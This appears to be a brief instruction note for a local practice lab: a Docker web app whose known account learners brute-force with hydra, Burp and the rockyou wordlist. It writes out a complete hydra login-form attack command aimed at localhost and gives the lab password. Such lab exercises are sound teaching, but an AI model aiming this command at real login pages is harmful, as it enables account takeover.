The command for attacking on localhost: `hydra -l ealderson -P rockyou.txt 127.0.0.1 http-post-form "/login:username=^USER^&password=^PASS^:Invalid Credentials" -V`

`sudo docker compose up` to run; username is `ealderson`, password is `qwerty123`. have them attack the web app using `hydra`, `burp`, and `rockyou` provided the username `ealderson`
